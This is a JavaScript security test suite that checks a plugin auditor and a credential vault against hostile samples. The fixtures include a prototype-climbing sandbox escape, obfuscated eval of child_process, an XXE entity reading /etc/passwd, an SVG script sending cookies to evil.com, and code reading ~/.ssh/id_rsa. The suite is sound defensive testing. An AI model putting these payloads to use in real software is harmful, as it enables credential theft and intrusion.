const assert = require('assert');
const path = require('path');
const { PluginAuditor } = require('../security/plugin_auditor');
const { Vault } = require('../security/vault');

console.log('\x1b[1;36mRunning Zero-Trust Plugin Security Test Suite...\x1b[0m\n');

let passedTests = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`\x1b[32m✔ [PASS]\x1b[0m ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`\x1b[31m✖ [FAIL]\x1b[0m ${name}:`, err.message);
    process.exit(1);
  }
}

// ------------------------------------------------------------------ 1. Vault Isolation Test
test('Vault isolation: getScopedCredentials never leaks foreign secrets or master keys', () => {
  const vault = new Vault();
  const hetznerCreds = vault.getScopedCredentials('hetzner');

  // Must only contain hetzner keys
  assert.strictEqual(typeof hetznerCreds.api_token, 'string');
  assert.strictEqual(hetznerCreds.storage_box, undefined, 'Storage box credentials leaked into hetzner scope!');
  assert.strictEqual(hetznerCreds.custom_servers, undefined, 'Custom servers leaked into hetzner scope!');

  // Must be frozen
  assert.throws(() => {
    'use strict';
    hetznerCreds.api_token = 'hacked';
  }, /Cannot assign to read only property|Cannot set property/);
});

// ------------------------------------------------------------------ 2. Prototype Climbing Test
test('Auditor blocks prototype climbing / sandbox escape attempt', () => {
  const rogueCode = `
    class RogueDriver {
      steal() {
        const stolen = [].constructor.constructor('return process')();
        return stolen;
      }
    }
    module.exports = RogueDriver;
  `;
  const report = PluginAuditor.auditDriverCode(rogueCode, { id: 'rogue', allowedDomains: [] });
  assert.strictEqual(report.status, 'BLOCKED');
  assert.ok(report.violations.some(v => v.includes('Prototype climbing')));
});

// ------------------------------------------------------------------ 3. Dynamic Code Execution Test
test('Auditor blocks dynamic eval() and new Function()', () => {
  const evalCode = `
    const sneaky = "child" + "_process";
    eval("require('" + sneaky + "')");
  `;
  const report = PluginAuditor.auditDriverCode(evalCode, { id: 'eval_exploit', allowedDomains: [] });
  assert.strictEqual(report.status, 'BLOCKED');
  assert.ok(report.violations.some(v => v.includes('eval()')));
  assert.ok(report.violations.some(v => v.includes('String concatenation obfuscation')));
});

// ------------------------------------------------------------------ 4. Multi-Root Domain Anomaly Test
test('Auditor detects multi-root domain trojan manifests', () => {
  const trojanManifest = {
    id: 'fake_provider',
    name: 'Fake Provider',
    allowedDomains: [
      'api.digitalocean.com',
      'stealer.attacker-domain.xyz',
      'another.random-exfil.net'
    ]
  };
  const report = PluginAuditor.auditManifest(trojanManifest);
  assert.strictEqual(report.status, 'WARNING');
  assert.ok(report.warnings.some(w => w.includes('Multi-Root Domain Anomaly')));
});

// ------------------------------------------------------------------ 5. SVG Sanitizer Test
test('SVG Sanitizer purges XXE bombs, <script>, and event handlers', () => {
  const dirtySvg = `
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert('pwned')">
      <script>fetch('http://evil.com?leak=' + document.cookie);</script>
      <rect width="20" height="20" fill="#ff0000" />
      <foreignObject width="100" height="100">
        <iframe src="http://evil.com"></iframe>
      </foreignObject>
    </svg>
  `;
  const { safeSvg, violations } = PluginAuditor.sanitizeSvg(dirtySvg);
  assert.ok(violations.some(v => v.includes('<!DOCTYPE>')));
  assert.ok(violations.some(v => v.includes('script')));
  assert.ok(violations.some(v => v.includes('onload')));
  assert.ok(violations.some(v => v.includes('foreignObject')));
  assert.ok(!safeSvg.includes('<script>'), 'Script tag remained in sanitized SVG!');
  assert.ok(!safeSvg.includes('onload='), 'Event handler remained in sanitized SVG!');
  assert.ok(!safeSvg.includes('<!DOCTYPE'), 'DOCTYPE remained in sanitized SVG!');
  assert.ok(safeSvg.includes('<rect width="20" height="20" fill="#ff0000" />'), 'Safe visual element was destroyed!');
});

// ------------------------------------------------------------------ 6. Undeclared Endpoint Call Test
test('Auditor blocks undeclared network calls in driver code', () => {
  const driverWithExfil = `
    const API = 'https://api.hetzner.cloud/v1';
    fetch('https://telemetry-data-collection.ru/log', { method: 'POST' });
  `;
  const manifest = {
    id: 'hetzner',
    allowedDomains: ['api.hetzner.cloud']
  };
  const report = PluginAuditor.auditDriverCode(driverWithExfil, manifest);
  assert.strictEqual(report.status, 'BLOCKED');
  assert.ok(report.violations.some(v => v.includes('telemetry-data-collection.ru')));
});

// ------------------------------------------------------------------ 7. Sensitive Host Filesystem Paths
test('Auditor blocks targeted reads of ~/.ssh and /etc/shadow', () => {
  const spyCode = `
    const key = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
  `;
  const report = PluginAuditor.auditDriverCode(spyCode, { id: 'spy', allowedDomains: [] });
  assert.strictEqual(report.status, 'BLOCKED');
  assert.ok(report.violations.some(v => v.includes('read SSH private keys') || v.includes('sensitive host filesystem')));
});

console.log(`\n\x1b[1;32mAll ${passedTests} security tests passed successfully!\x1b[0m\n`);
